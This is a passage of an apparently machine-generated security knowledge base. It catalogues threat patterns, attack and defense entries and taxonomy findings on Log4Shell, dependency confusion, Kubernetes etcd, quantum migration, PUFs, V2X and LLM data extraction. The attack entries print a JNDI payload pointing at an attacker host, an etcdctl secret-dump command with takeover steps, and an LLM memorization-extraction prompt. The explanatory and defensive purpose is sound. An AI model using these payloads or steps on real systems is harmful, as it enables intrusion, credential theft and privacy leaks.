PATTERN 38.1 — HARVEST-NOW-DECRYPT-LATER AS TEMPORAL ATTACK PATTERN
─────────────────────────────────────────────────────────────────────────────
Classification: R04 (cryptographic weakness — prospective); Domain: D333 (quantum)

HNDL (Harvest Now, Decrypt Later): attacker intercepts encrypted communications
today; stores ciphertext; decrypts when cryptanalytic capability improves.
This is not a new concept (intelligence agencies have always done this) but
the quantum computing threat quantifies the future capability deadline.

Structural properties:
  (a) Attack is passive and undetectable (traffic interception, not modification)
  (b) Cost of storage has collapsed (1 TB costs ~$20); massive-scale collection
      is operationally trivial; nation-states store internet backbone traffic
  (c) The future decryption event is not in attacker's control (depends
      on CRQC development); but data value may exceed CRQC timeline
  (d) Data with long-term sensitivity is at risk NOW even though CRQC
      does not yet exist; data loses confidentiality on CRQC arrival

Affected data categories:
  Diplomatic communications (value persists decades)
  Classified government secrets (clearance lifetime 25-75 years)
  Medical records (lifetime of patient + legal retention period)
  Financial account credentials (if reused; password validity long-lived)
  Intellectual property (product design valid for years to decades)
  Legal privileged communications (attorney-client; indefinite protection)

Current TLS protection:
  TLS 1.3: uses ECDHE for forward secrecy (each session has new keys);
    forward secrecy means session key compromised later ≠ past session decrypted
    EXCEPT: ECDHE itself is broken by Shor's algorithm;
    if attacker records TLS handshake AND session traffic, and later has CRQC,
    attacker can break ECDHE key agreement from recorded handshake data
    and decrypt all session traffic
  Implication: TLS 1.3 with ECDHE is not HNDL-resistant without PQC key exchange
  PQC TLS: RFC 8446 (TLS 1.3) extended with PQC key encapsulation;
    X25519+ML-KEM hybrid (Google Chrome supports; major browsers adding);
    IETF RFC in progress; major CDNs (Cloudflare, Amazon) deploying

─────────────────────────────────────────────────────────────────────────────
PATTERN 38.2 — TRANSITIVE DEPENDENCY AS HIDDEN ATTACK SURFACE
─────────────────────────────────────────────────────────────────────────────
Classification: R08 (supply chain); Domain: D335 (SBOM)

Direct dependencies are visible in requirements files; transitive dependencies
(dependencies of dependencies) may be many levels deep and invisible.
Log4Shell paradigm:
  Log4j2 used as logging library; appears in direct dependencies of
  some applications; but Log4j2 is also a transitive dependency in
  Spring Framework, Apache Struts, Apache Kafka, Minecraft, VMware,
  Cisco, IBM, and hundreds of enterprise products
  Many organizations did not know they had Log4j2 because it was 3rd, 4th,
  or 5th level transitive dependency
  SBOM enables rapid enumeration; without SBOM, affected software unknown

Dependency hijacking variants:
  Dependency confusion: attacker publishes package with same name as
    private internal package to public registry (PyPI, npm); package
    manager pulls public version (higher version number wins);
    executes attacker code in developer/CI environment
    Demonstrated: Alex Birsan (2021); affected Apple, Microsoft, PayPal,
    Shopify, Tesla; systematic technique for attacking software supply chains
  Typosquatting: attacker publishes 'reqests' (vs 'requests'); developers
    make typo; install attacker package; package executes at install time
    (setup.py or postinstall script is code execution)
  Star jacking: attacker creates malicious package; hijacks GitHub stars
    count display; appears popular in package registry search

Pattern structure: any ecosystem with centralized package registry (npm,
PyPI, Maven Central, RubyGems, NuGet) has this attack surface; registry
is a trust anchor for the entire ecosystem; trust is based on package
name match, not identity of uploader

─────────────────────────────────────────────────────────────────────────────
PATTERN 38.3 — QUANTUM-SAFE MIGRATION AS COORDINATED PROTOCOL REPLACEMENT
─────────────────────────────────────────────────────────────────────────────
Classification: LAW-1 application; Domain: D333

The quantum-safe migration is structurally different from normal vulnerability
patching in one critical way: the window to act is measured in years, the
scope is global, and the consequence of failure is retroactive (HNDL data
collected NOW becomes decryptable in the future even if migration occurs later).
This creates a different urgency calculus than typical patching:
  Normal patch: vulnerability discovered → exploit available NOW → patch NOW
  PQC migration: threat arrives in ~2030 → migrate before 2030 → data
    collected before migration and retained by adversary is retroactively exposed
  The urgency is measured by HNDL storage horizon, not exploit availability

Migration scope (compared to LAW-1):
  LAW-1 instances are domain-specific (CAN bus, BACnet, ADS-B);
  PQC migration is UNIVERSAL — every system using asymmetric cryptography
  (RSA, ECDSA, ECDH, DH) must migrate; this includes:
    TLS (all HTTPS, VPN, email, messaging)
    Code signing (all software update mechanisms)
    PKI (all certificate authorities)
    SSH
    PGP/S-MIME
    DNS (DNSSEC)
    RPKI (BGP route signing)
    Mobile network security (LTE/5G)
    Payment processing (EMV chip)
    Passport/identity document signing
  Coordination scale: LAW-1 is within-domain; PQC migration is cross-domain
  simultaneous replacement of a global cryptographic substrate
  This is the largest coordinated cryptographic migration in history;
  previous: DES→AES, MD5→SHA-256, TLS 1.0→TLS 1.3; none at this scale

─────────────────────────────────────────────────────────────────────────────
PATTERN 38.4 — ETCD AS KUBERNETES MASTER KEY: SINGLE POINT OF COMPROMISE
─────────────────────────────────────────────────────────────────────────────
Classification: R06 (trust boundary collapse via configuration); Domain: D334

Kubernetes stores all cluster state in etcd (key-value store):
  Cluster configuration, deployment specs, ConfigMaps
  Secrets (base64-encoded, not encrypted by default in many deployments)
  Service account tokens (including long-lived cluster-admin tokens)
  Certificate authority keys and certificates
  NetworkPolicy configurations

etcd compromise = complete cluster compromise:
  Read etcd → extract all secrets, service account tokens, CA private keys
  Modify etcd → alter any deployment (add container with privilege escalation,
    modify RBAC to grant admin, inject malicious init container)
  Delete etcd entries → destroy cluster configuration (ransomware equivalent)

Attack paths to etcd:
  (a) Network: etcd listens on 2379-2380; older clusters may not enforce
      TLS on etcd API; any network-accessible etcd without auth = full cluster
  (b) etcd backup files: etcd backups often stored on object storage or
      shared file system; backup file contains complete cluster state;
      if backup is readable, cluster state is compromised
  (c) Control plane node: etcd runs on control plane node(s);
      control plane node compromise → etcd access via localhost
  (d) Cloud provider console: managed Kubernetes (EKS, GKE, AKS) typically
      encrypt etcd at rest; but cloud IAM admin can still access cluster;
      etcd encryption at rest ≠ access control

Default configuration gaps:
  EKS: etcd encrypted at rest; secrets not additionally encrypted by default;
    IRSA (IAM Roles for Service Accounts) reduces token abuse
  GKE: application-layer secret encryption optional (not default)
  AKS: encryption at rest; Azure Key Vault integration for secrets optional

PATTERNS CUMULATIVE: 152 (38.1-38.4)

────────────────────────────────────────────────────────────────────────────────
ANATOMY 116 — G195: ML MODEL WATERMARKING
────────────────────────────────────────────────────────────────────────────────
Context: ML model watermarking embeds a secret signal in model behavior
  that allows the model owner to prove ownership of a stolen/copied model.
  Distinct from adversarial examples; watermark persists through fine-tuning.

Threat model:
  Model theft: API-based extraction (black-box) or weight theft (insider,
    breach of model storage); stolen model used commercially without license
  Problem: proving ownership requires distinguishing stolen copy from
    independently trained similar model (coincidental similarity)

Watermarking approaches:

1. Backdoor-based watermarking (Adi et al. 2018; Zhang et al. 2018):
    Embed backdoor trigger during training: specific input → specific output
    Ownership proof: present trigger to suspect model; if output matches
    watermark signature, model is a copy
    Limitation:
      (a) Model extractor can remove watermark via fine-tuning on clean data
          (watermark accuracy degrades faster than main task accuracy)
      (b) Attacker can detect backdoor-style watermarks and remove selectively
      (c) Third party cannot verify ownership without knowing secret trigger;
          if trigger leaked, false ownership claims possible

2. Feature-space watermarking (Merrer et al. 2020):
    Subtly alter decision boundary near adversarial examples;
    extracted model inherits these boundary modifications
    Ownership verification: query suspect model with boundary-probing inputs;
    compare to expected boundary shape
    Limitation: works for black-box extraction; less effective if attacker
    has direct access to weights

3. Radioactive data (Sablayrolles et al. 2020):
    Watermark training data rather than model; modified training examples
    leave statistical fingerprint in model's internal representations
    Ownership verification: check if model's representation of watermarked
    examples clusters anomalously; requires white-box access to verify

4. Parameter-space watermarking:
    Embed sequence in model weights (low-order bits of weight values);
    survives compression and quantization poorly; pruning removes watermark;
    not robust to common model optimization steps

Current state:
  No watermarking technique is both robust to adaptive removal AND
  verifiable without model internals. Strong robustness vs. verifiability
  tradeoff. Active research area; no deployed legal standard for
  ML watermark-based ownership proof.
  G195: CLOSED (open research frontier documented)

────────────────────────────────────────────────────────────────────────────────
ANATOMY 117 — G197: PUF ML MODELING ATTACK METHODOLOGY
────────────────────────────────────────────────────────────────────────────────
Context: Physical Unclonable Functions (PUFs) are hardware primitives
  that exploit manufacturing variation to produce device-unique responses.
  Used for device authentication, key generation, anti-counterfeiting.
  ML modeling attack: attacker uses machine learning to predict PUF
  response to arbitrary challenge without physical access to device.

PUF operating principle:
  Challenge: binary string applied to PUF circuit
  Response: binary string derived from circuit propagation delays
  (manufacturing variation in transistor threshold voltage, gate oxide
  thickness, wire resistance causes path-specific delays)
  Same challenge → same response on same device (stable)
  Same challenge → different response on different device (unique)
  Strong PUF: exponential number of challenge-response pairs (CRPs);
  impractical to enumerate all CRPs

ML modeling attack (Ruhrmair et al. 2010, 2013):
  Precondition: attacker observes N challenge-response pairs from target
  (obtained by physical access during manufacture, testing, deployment)
  Step 1: Collect CRPs (N = 10,000 to 1,000,000 depending on PUF type)
  Step 2: Train machine learning model (logistic regression for Arbiter PUF;
    neural network for XOR Arbiter PUF) on collected CRPs
  Step 3: Trained model predicts responses to new challenges with >99%
    accuracy (for Arbiter PUF); effectively clones PUF in software
  Step 4: Attacker can now impersonate target device for any challenge
  (has software model that produces correct responses without hardware)

PUF types and ML attack susceptibility:
  Arbiter PUF: linear model; logistic regression achieves >99% with
    ~20,000 CRPs; BROKEN for authentication
  XOR Arbiter PUF: non-linear; harder; neural network needed;
    >99% accuracy with ~10^5 to 10^6 CRPs depending on XOR width k;
    k=4 broken with available compute; k=8 computationally intensive
    but not infeasible for nation-state
  Ring Oscillator (RO) PUF: frequency-based; frequency comparison
    attacked by ML (Alkatheiri et al. 2017); broken
  SRAM PUF: startup state-based; all cells read at once (not CRP structure);
    ML modeling attack less applicable (response is static, not per-challenge);
    physical readout attack more relevant

Defenses against ML modeling attack:
  Controlled PUF (CPUF): rate-limit CRP access; challenge and response
    not directly observable (response used in secure protocol internally)
  Fuzzy extractor: PUF response used to derive key; key not exposed;
    attacker cannot observe responses even if they know challenges
  Lightweight secure sketch: error correction on noisy PUF response;
    combined with key derivation; only key output exposed
  XOR PUF with large k: computationally expensive ML attack;
    practical security degrades as compute increases
  Physically Obfuscated Key (POK): PUF used only for key generation
    at device boot; key never stored; PUF interface closed after boot;
    attacker cannot observe CRPs because interface is not accessible
  Current recommendation: Arbiter PUF and XOR Arbiter PUF with k≤6
    are NOT secure for authentication; SRAM PUF with POK architecture
    or controlled PUF protocols are preferred
  G197: CLOSED

────────────────────────────────────────────────────────────────────────────────
ANATOMY 118 — G198: V2X SYBIL ATTACK VIA SCMS COMPROMISE
────────────────────────────────────────────────────────────────────────────────
Context: SCMS (Security Credential Management System) is the US V2X PKI
  infrastructure. Compromising SCMS itself is a higher-order attack than
  individual vehicle exploitation. G198 covers SCMS-level threat model.

SCMS architecture (US DOT / CVE Consortium):
  Root CA: offline; signs Intermediate CAs; key ceremony required for changes
  Intermediate CA (ICA): signs operational CAs
  Pseudonym Certificate Authority (PCA): issues short-lived pseudonymous
    certs to vehicles (~1 week lifetime); stores enrollment linkage
  Linkage Authority (LA1, LA2): provide unlinkability tokens; two LAs
    required to link pseudonym to real identity (designed so that
    two compromised LAs are required for full deanonymization)
  Enrollment CA: issues long-term enrollment credentials to vehicles
    at manufacturing time
  Misbehavior Authority (MA): receives misbehavior reports; analyzes;
    instructs PCA to revoke certificates

SCMS compromise scenarios:

Scenario A: PCA compromise
    Attacker compromises Pseudonym Certificate Authority
    Effect: issue arbitrary number of valid pseudonymous certificates
    to attacker-controlled entities; unlimited Sybil attack capability;
    all certs signed by legitimate PCA; indistinguishable from real vehicle certs
    Detection: anomalous cert issuance rate; if MA receives reports of
    misbehavior involving certs from specific PCA, investigation
    Mitigation: HSM for PCA signing key; key ceremony requirements;
    audit logging of cert issuance; rate limiting on issuance

Scenario B: Enrollment CA compromise
    Attacker compromises enrollment CA or manufacturing provisioning process
    Effect: provision adversarial vehicle enrollment credentials;
    adversarial vehicles receive legitimate pseudonymous certs from PCA;
    long-term compromise; harder to detect than PCA compromise

Scenario C: Linkage Authority compromise (both LAs)
    Attacker compromises both LA1 and LA2 (required together for linkage)
    Effect: complete deanonymization of all V2X participants;
    link every BSM to real vehicle identity; privacy failure at fleet scale
    This is not a Sybil attack but a privacy attack; the two-LA design
    is specifically to prevent this from a single insider
    Two-LA compromise: requires insider at both organizations
    OR compromise of communication between them

Scenario D: Misbehavior Authority manipulation
    Attacker compromises MA or misbehavior reporting pipeline
    Effect: suppress revocation of misbehaving vehicles; falsely
    revoke legitimate vehicles; targeted denial of service (legitimate
    vehicle can no longer communicate as all its certs revoked)

Current SCMS operational security:
  Key ceremony requirements for Root CA operations
  HSMs for all CA signing keys
  Distributed trust: multiple LAs, multiple ICAs
  Physical security requirements for SCMS facilities
  Not yet operationally deployed at scale (US SCMS in pilot phase 2025)
  G198: CLOSED

────────────────────────────────────────────────────────────────────────────────
ANATOMY 119 — G200: CAN INTRUSION DETECTION SYSTEM ARCHITECTURE
────────────────────────────────────────────────────────────────────────────────
Context: Given that CAN bus has no authentication (LAW-1 class), IDS is
  the primary compensating control. G200 covers the technical architecture
  of automotive CAN IDS and its known limitations.

CAN IDS approaches:

1. Whitelist-based (CAN ID and frequency filtering):
    Each CAN ID has a specified transmission frequency (vehicle CAN matrix);
    IDS monitors inter-message timing; anomaly if unexpected ID appears
    or frequency deviates significantly
    Limitation: attacker who knows vehicle CAN matrix can inject messages
    at expected frequency; ECU masquerade attack (pretend to be different
    ECU by matching its CAN ID and timing)

2. Voltage fingerprinting (clock-based):
    Each ECU has slightly different clock frequency (crystal oscillator
    manufacturing variation); CAN frame timing has characteristic
    inter-frame gap fingerprint per ECU;
    IDS learns ECU fingerprints; flags frames with wrong timing fingerprint
    for claimed ID
    Demonstrated: Cho & Shin (2016); fingerprinting CAN transceivers
    Limitation: fingerprint changes with temperature, aging; OBD-II
    device with matched clock frequency can evade

3. Physical layer fingerprinting (signal shape):
    CAN transceiver has characteristic signal shape (rise time, fall time,
    reflections, impedance matching); IDS with analog signal sampling
    can fingerprint individual transceivers
    Requires hardware-level sampling (ADC on CAN bus)
    Limitation: expensive hardware addition; affected by vehicle aging,
    temperature, wiring changes

4. Deep packet inspection / semantic analysis:
    IDS understands payload semantics (e.g., brake pressure signal should
    not jump discontinuously; steering angle should correlate with vehicle
    speed); flags physically impossible combinations
    Limitation: requires knowledge of all signal encodings in vehicle
    (OEM-proprietary; not standardized); computationally intensive;
    attacker who understands physics can craft physically plausible attack

5. Machine learning anomaly detection:
    Train ML model on normal CAN traffic patterns (time series of CAN
    IDs, payloads, frequencies); flag deviations
    Limitation: adversarial examples for CAN IDS (attacker can craft CAN
    traffic that evades ML IDS while still achieving attack goal);
    false positive rate challenge in safety-critical context
    (IDS cannot trigger safety response on every false positive)

Deployment status:
  No CAN IDS approach is effective against all attack types
  AUTOSAR SecOC (authentication) is preferred over IDS because it
  prevents injection rather than detects it
  IDS is a compensating control for legacy vehicles without SecOC
  Aftermarket CAN IDS devices: exist commercially; limited to frequency
  and whitelist approaches; minimal deployment in practice
  G200: CLOSED

ATTACK 313 — LOG4SHELL EXPLOITATION (CVE-2021-44228)
Root: R02 (memory safety / input handling); R01 (ambient authority via logging)
Domain: D335 (SBOM / dependency), D090 (web application)
Mechanism: Log4j2 JNDI (Java Naming and Directory Interface) lookup in log
message content; attacker sends string '${jndi:ldap://attacker.com/exploit}'
in any field that gets logged (User-Agent, X-Forwarded-For, username,
search query); Log4j2 resolves JNDI reference; connects to attacker LDAP;
loads attacker-supplied Java class; executes arbitrary code on server
Precondition: any application using Log4j2 2.0-2.14.1 that logs user input
Effect: remote code execution on server; initial foothold; privilege of
application service account; exploitation of virtually any Java application
at internet scale (VMware, Cisco, Apache, Minecraft, IBM, Oracle affected)
Severity: CVSS 10.0; initial exploitation in the wild within hours of PoC
publication (December 9, 2021); hundreds of millions of vulnerable instances

ATTACK 314 — DEPENDENCY CONFUSION SUPPLY CHAIN ATTACK
Root: R08 (supply chain); Domain: D335
Mechanism: Identify private package names used in target organization's
build system (from public code, error messages, dependency files);
publish package with same name to public registry (PyPI/npm/Maven) at
version number higher than internal version; package manager prefers public
package (higher version); install-time code (setup.py, postinstall) executes
on developer or CI machine
Effect: arbitrary code execution in developer environment and CI pipeline;
access to build secrets, source code, deployment credentials
Demonstrated: Alex Birsan (2021); affected Apple, Microsoft, PayPal, Tesla,
Shopify, Uber among others; technique is systematic and repeatable

ATTACK 315 — KUBERNETES ETCD DIRECT ACCESS
Root: R06 (trust boundary collapse — etcd exposed on cluster network)
Domain: D334 (Kubernetes)
Mechanism: etcd API accessible on port 2379 from cluster network;
no additional authentication beyond TLS client certificate (which may be
overly permissive) or no authentication at all in misconfigured clusters;
etcd CRUDL operations provide full cluster state read/write
Step 1: Identify etcd endpoint (typically control plane node IP:2379)
Step 2: If no client cert required: etcdctl --endpoints=http://etcd:2379 get / --prefix
Step 3: Extract all secrets: base64-decode and read service account tokens,
  TLS certificates, database credentials stored in K8s secrets
Step 4: Modify cluster: inject privileged pod definition; patch RBAC to
  grant cluster-admin to attacker-controlled service account
Effect: complete cluster takeover; all namespace secrets; all workloads
affected; lateral movement to all cloud resources accessible from cluster

ATTACK 316 — LLM TRAINING DATA EXTRACTION (MEMORIZATION)
Root: R04 (data exposure via model behavior); Domain: D332 (LLM security)
Mechanism: LLMs memorize verbatim training data; prompt model to complete
sequences that appear in training data; model completes with memorized content
Example prompts: repeat this phrase 100 times → model falls into memorized
  content (Nasr et al. 2023 — ChatGPT memorization extraction)
Effect: extraction of PII (email addresses, phone numbers, SSNs if in
training data), copyrighted text, proprietary documents
Severity: Carlini et al. (2021) extracted 600 specific training examples
including names, addresses, phone numbers from GPT-2; Nasr et al. (2023)
extracted memorized content from production ChatGPT

ATTACK 317 — HARVEST-NOW-DECRYPT-LATER TLS COLLECTION
Root: R04 (cryptographic weakness — prospective); Domain: D333
Mechanism: Nation-state actor performs passive collection of TLS session
traffic (including ClientHello/ServerHello handshake) from backbone taps;
stores encrypted sessions at scale; when CRQC available (estimated 2030-2035),
breaks ECDHE key exchange from recorded handshake data; decrypts all stored
session content
Precondition: backbone-level traffic interception capability (SIGINT);
large-scale storage; future CRQC access
Current state: all data encrypted with classical asymmetric key exchange
(ECDHE, RSA) is HNDL-vulnerable; TLS 1.3 forward secrecy does not help
(ECDHE itself is broken by Shor's; handshake recording = session key recovery)
Mitigation: PQC TLS (X25519+ML-KEM hybrid); Cloudflare/Google deploying;
data with long-term sensitivity must be protected by PQC key exchange NOW

ATTACK 318 — PICKLE DESERIALIZATION RCE IN ML MODEL LOADING
Root: R02 (unsafe deserialization); Domain: D329, D335
Mechanism: PyTorch .pt and .pkl files use Python pickle serialization;
pickle deserialization executes arbitrary Python code (via __reduce__ method);
attacker uploads malicious model file to shared model repository;
victim loads model with torch.load() or similar; malicious pickle
executes at load time with victim's process privileges
Effect: remote code execution on ML researcher's or production inference
server; exfiltration of model IP, training data, secrets; persistence
via loaded model serving infrastructure
Mitigation: torch.load(weights_only=True) in PyTorch 2.x; use safetensors
format (no code execution at load time); verify model hash against known-good

DEFENSE 434 — LOG4J JNDI LOOKUP DISABLE / LOG4J2 UPGRADE
Domain: D335; Counters: A313
Mechanism: Log4j2 2.15.0+ disables JNDI lookups by default;
2.16.0+ removes JNDI support entirely; 2.17.0 addresses additional
bypass CVEs; Java system property 'log4j2.formatMsgNoLookups=true'
mitigates in 2.14.1 without upgrade; WAF rules to block ${jndi:} pattern
Remediation complexity: transitive dependency; many applications do not
know they use Log4j2; requires SBOM to enumerate affected systems;
some Log4j2 instances embedded in fat JARs (requires repackaging, not
just dependency version update)

DEFENSE 435 — PRIVATE PACKAGE NAMESPACE ENFORCEMENT
Domain: D335; Counters: A314
Mechanism: npm scoped packages (@org/package-name) are namespace-protected;
private registry (Artifactory, AWS CodeArtifact) configured to never fall
through to public registry for known-private namespaces;
package manager configuration: only public registry for public packages,
private registry for private packages; dependency pinning with hash verification
Policy: internal package naming conventions that are not valid public names;
publishing allowlist that prevents internal names from appearing on public registry

DEFENSE 436 — ETCD ENCRYPTION AT REST AND NETWORK ISOLATION
Domain: D334; Counters: A315
Mechanism: Kubernetes EncryptionConfiguration: encrypt etcd data at rest
with AES-256 or secretbox; etcd network policies: etcd ports only accessible
from control plane nodes; etcd client certificates: mutual TLS with distinct
CA; audit logging of all etcd operations
Cloud-managed: EKS/GKE/AKS encrypt etcd at rest by default; application-
layer secrets encryption (KMS-backed) provides defense in depth
Limitation: encryption at rest does not protect against live access by
compromised control plane; network isolation does not protect against
insider with control plane credentials

DEFENSE 437 — DIFFERENTIAL PRIVACY IN LLM TRAINING
Domain: D332; Counters: A316
Mechanism: DP-SGD (Differentially Private Stochastic Gradient Descent)
clips per-sample gradients and adds calibrated Gaussian noise during training;
formally bounds information leakable about any individual training example
(epsilon-delta DP guarantee); prevents memorization at specified epsilon
Tradeoff: privacy epsilon vs. model accuracy; epsilon=1 provides strong
privacy but significant accuracy loss on most tasks; epsilon=8 provides
moderate privacy with small accuracy loss
Deployment: Google's DP library; Apple's ML on-device training;
OpenAI evaluating for fine-tuning; not yet standard for foundation models

DEFENSE 438 — SAFETENSORS FORMAT FOR ML MODEL DISTRIBUTION
Domain: D329; Counters: A318
Mechanism: Hugging Face safetensors format: stores model weights as flat
numpy arrays; no code execution at load time; format specification is
pure data (no __reduce__ or arbitrary Python callable); load is O(1)
memory mapping with format validation
Limitation: not all frameworks support safetensors natively;
PyTorch conversion from .pt to .safetensors required; older models
predominantly in pickle format; adoption growing but not universal

ATTACKS CUMULATIVE: 318
DEFENSES CUMULATIVE: 438

CYCLE 38 — STAGE 5: CONVERGENCE ANALYSIS
════════════════════════════════════════════════════════════════════════════════
ENTERING STATE: 273 convergence findings | R10.5 counter-example cycle 4 of 5

CONVERGENCE FINDING 274 — R10.5 COUNTER-EXAMPLE CYCLE 4: UNSAFE DESERIALIZATION
Candidate: Pickle deserialization RCE (A318) as potential R10.5 or new class

Pickle analysis:
  Python pickle protocol: designed to serialize arbitrary Python objects;
  __reduce__ method enables arbitrary code at deserialization time;
  this is a FEATURE of the design (arbitrary object reconstruction requires
  arbitrary code); the security problem is using it in adversarial context
  R10.5 fit check:
    Performance optimization? Pickle's arbitrary code execution is not a
    performance feature; it is a correctness feature (allows complex object
    serialization including lambda, class methods); no optimization involved
    Physical medium leakage? No; this is not a side channel; it is direct
    execution of embedded code
    Microarchitectural? No; purely software
  Classification: NOT R10.5
  Better fit: R02 (unsafe input handling) — deserialization of untrusted
  input is an input validation failure; the spec is unambiguous (pickle
  executes code); the error is using pickle for untrusted data
  Also fits: R10.2 (implementation divergence) partially — 'protocol' for
  data exchange used in context where security properties are not what the
  protocol provides; but this is more design misuse than divergence

Alternative new class candidate: R10.6 — FEATURE-SECURITY CONTEXT MISMATCH
    A feature designed for trusted context is deployed in untrusted context;
    the feature's capabilities (code execution, network access, dynamic loading)
    become vulnerabilities when input comes from adversary
    Instances:
      Pickle: object serialization with code execution; safe in trusted context
      JNDI in Log4j: directory service lookup; safe in trusted context;
        attacker-controlled log content = untrusted context
      XXE: external entity resolution; safe in trusted context;
        user-supplied XML = untrusted context
      SSRF: URL fetching by server; safe for internal use; external user
        controlling URL = untrusted context
      eval() in JavaScript: safe for trusted code; user input to eval = disaster
    This is conceptually distinct from R10.1 (spec ambiguity) and R10.2
    (implementation divergence): the spec is clear; the implementation is
    correct; the security error is deploying a powerful feature in wrong context

Classification verdict: R10.6 DRAFT — FEATURE-SECURITY CONTEXT MISMATCH
    Candidate instances: pickle, JNDI/Log4j, XXE, SSRF, eval()
    Does not fit R10.1-R10.5 cleanly
    R10.5 counter-example: NOT APPLICABLE (candidate for R10.6, not R10.5)
    R10.5 status: still DRAFT, counter-example cycle 4 passed without falsification

CONVERGENCE FINDING 275 — R10.6 DRAFT CONFIRMATION CANDIDATES
R10.6 (feature-security context mismatch) candidate instances from this loop:
  Log4j/JNDI: logging feature (message lookup) in adversarial context
  Python pickle: serialization feature in adversarial context
  XML XXE: entity resolution feature in adversarial context
  SSRF: URL fetching feature in adversarial context (server fetches attacker URL)
  eval()/exec(): code evaluation feature in adversarial context
  SQL injection (N-tier context): SQL string construction feature in
    adversarial context (user input mixed with SQL commands)
    Note: SQL injection is typically classified as R02 or input validation;
    the R10.6 lens adds: the SQL parser's feature of accepting dynamic SQL
    is correct behavior; the error is mixing untrusted input with SQL
  Unix command injection: shell interpolation feature in adversarial context
  SSTI (Server-Side Template Injection): template rendering feature in
    adversarial context

Cross-instance structural property:
    (a) Capability exists for legitimate purpose in trusted context
    (b) The capability is correct and expected behavior
    (c) Input path exists from untrusted source to capability invocation
    (d) Capability executes with server/application privileges
    (e) Security model assumed trusted-context; adversarial context was
        not in scope of design

R10.6 DRAFT: requires 3 of 5 counter-example cycles without falsification
  Cycle 1 begins next cycle

CONVERGENCE FINDING 276 — SBOM AS NECESSARY BUT INSUFFICIENT SECURITY CONTROL
SBOM (Software Bill of Materials) addresses the discovery problem (what
components are present) but not the remediation problem:
  Log4Shell: SBOM enabled rapid identification of affected systems
  BUT: remediation required patching every affected application
    — embedded in fat JARs: requires repackaging, not just dependency update
    — vendor-provided software: dependent on vendor releasing patch
    — legacy applications: unmaintained; no patch available
  SBOM reduces time-to-discovery from days/weeks to hours/minutes
  SBOM does not reduce time-to-remediation for:
    (a) Transitive dependencies in proprietary vendor software
    (b) End-of-life software where vendor has abandoned maintenance
    (c) Components where patch requires incompatible API changes

SBOM + VEX (Vulnerability Exploitability eXchange):
    VEX: machine-readable statement of whether CVE is actually exploitable
    in specific product context (not affected, affected, fixed, in-progress)
    Combined: SBOM locates component; VEX determines exploitability;
    reduces false-positive triage burden
    But: VEX requires vendor to publish and maintain; many vendors do not

Finding: SBOM is LAW-1-class partial solution — it addresses one dimension
  (visibility) of a multi-dimensional problem (visibility + vendor patching +
  remediation capability + lifecycle management)

CONVERGENCE FINDING 277 — QUANTUM MIGRATION IS UNIQUE IN SECURITY HISTORY
Pattern 38.3 convergence: PQC migration is unprecedented in scope.
Previous global cryptographic transitions:
  DES → 3DES/AES (1998-2001): algorithm upgrade; same PKI structure; 3-5 years
  MD5/SHA-1 → SHA-256 (2010-2015): hash function upgrade; backward compatible
  TLS 1.0 → TLS 1.3 (2018-2022): protocol upgrade; same key exchange families
  All previous: additive (old algorithm deprecated, new added; transition period)
  PQC migration: ALL existing asymmetric algorithms broken simultaneously;
    RSA, ECDSA, ECDH, DH — no gradualism possible (Shor's is a class break)
    Estimate: 3-5 billion deployed endpoints using classical asymmetric crypto
    Migration requires: protocol update + implementation + hardware (in some cases)
    Timeline constraint: HNDL means sensitive data encrypted today is at risk
    without a fixed date when decryption occurs
  This is the first migration where failure affects ALL prior ciphertext,
  not just future communications. It is retroactive and anticipatory simultaneously.
  No comparable event in security history.

CONVERGENCE SUMMARY C38:
  R10.5 counter-example: NOT FOUND (cycle 4 of 5); one cycle remains
  R10.6 DRAFT: feature-security context mismatch; Log4j, pickle, XXE, SSRF, eval
  SBOM as necessary but insufficient; LAW-1 partial solution
  PQC migration: unique in security history; retroactive + anticipatory
  Anatomy backlog at historic low: 1 (G210 only)

CONVERGENCE FINDINGS CUMULATIVE: 277

DOMAIN LEDGER ADDITIONS — CYCLE 39

D336 — Zero-Knowledge Proofs in Security
  Description: ZKP (Zero-Knowledge Proof) — cryptographic primitive allowing
  prover to convince verifier of statement's truth without revealing why
  it's true; interactive (sigma protocols) and non-interactive (zk-SNARKs,
  zk-STARKs, Bulletproofs)
  Security applications:
    Anonymous authentication: prove you hold a valid credential without
      revealing which credential (Anonimity in V2X — approach 2 from G215)
    Privacy-preserving audit: prove computation was performed correctly
      without revealing inputs (regulatory compliance without data disclosure)
    Cross-chain bridges (blockchain): prove state from one chain to another
    Passport/identity: prove age without revealing birthdate (selective disclosure)
  Security of ZKP systems:
    Trusted setup: zk-SNARKs require trusted setup ceremony; if ceremony
      compromised (toxic waste not destroyed), prover can forge proofs;
      Zcash powers-of-tau ceremony (2018); Groth16 trusted setup vulnerability
      if ceremony fails
    Soundness: if cryptographic assumptions (discrete log, hash collision
      resistance) broken, ZKP soundness fails; PQC ZKP systems exist
      (zk-STARKs: hash-based; quantum-resistant)
    Implementation bugs: ZKP library vulnerabilities can break soundness
      (Circom underconstrained circuits — specific ZKP language bugs allowing
      prover to cheat verifier without breaking crypto)

D337 — Dark Web and Cybercrime Ecosystem
  Description: underground markets, ransomware-as-a-service (RaaS) ecosystem,
  initial access broker (IAB) market, stolen credential markets
  Ransomware-as-a-service (RaaS): ransomware operators provide infrastructure
    (encryption, C2, payment, negotiation, leak site) to affiliates;
    affiliates perform compromise; revenue split (affiliates ~70-80%);
    examples: REvil, LockBit, ALPHV/BlackCat, Cl0p; specialized roles enable
    high-volume attacks with low barrier to entry for affiliates
  Initial Access Broker (IAB): specializes in initial compromise and access
    sale; sells access to compromised networks on darknet forums;
    RaaS affiliates purchase access; enables supply chain within criminal ecosystem
  Credential markets: billions of stolen credentials from breaches;
    Breach Compilation (2017): 1.4B credential pairs; 2024 RockYou2024:
    10 billion plaintext passwords compiled; credential stuffing infrastructure
  Double extortion: ransomware + data theft; victim pays or data published
    on leak site; triples leverage against victim
  Critical infrastructure targeting: healthcare, education, manufacturing
    targeted for high ransom potential and low tolerance for downtime

D338 — Bug Bounty and Vulnerability Disclosure Programs
  Description: coordinated vulnerability disclosure (CVD); bug bounty programs;
  responsible disclosure norms; VDP (Vulnerability Disclosure Policy);
  CISA BOD 20-01 (US federal agencies VDP mandate)
  Economic model: researcher discovers vulnerability; reports to vendor;
  vendor acknowledges and patches; researcher may receive bounty;
  prevents zero-day market sale by providing legitimate alternative
  Major programs: HackerOne, Bugcrowd, Intigriti platforms;
  Google Project Zero (internal); Google Bug Hunter (external);
  Microsoft MSRC; Apple Security Bounties; NSA CVD program
  Zero-day market alternative: Zerodium, Crowdfence pay $100k-$2.5M for
